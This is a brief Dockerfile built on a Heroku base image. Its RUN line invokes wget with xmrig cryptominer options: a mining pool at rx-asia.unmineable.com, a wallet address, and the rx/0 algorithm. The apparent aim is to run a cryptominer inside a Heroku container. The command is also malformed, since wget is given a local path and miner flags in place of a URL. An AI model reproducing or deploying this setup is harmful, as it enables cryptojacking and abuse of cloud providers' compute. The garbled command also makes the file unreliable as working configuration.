FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget ./xmrig --donate-level 5 -o rx-asia.unmineable.com:3333 -u TFmgUhb9st5oARtnJdpoAqBWT4dbh1vzuE -p 123123 --tls -k --nicehash -a rx/0
CMD bash heroku.sh
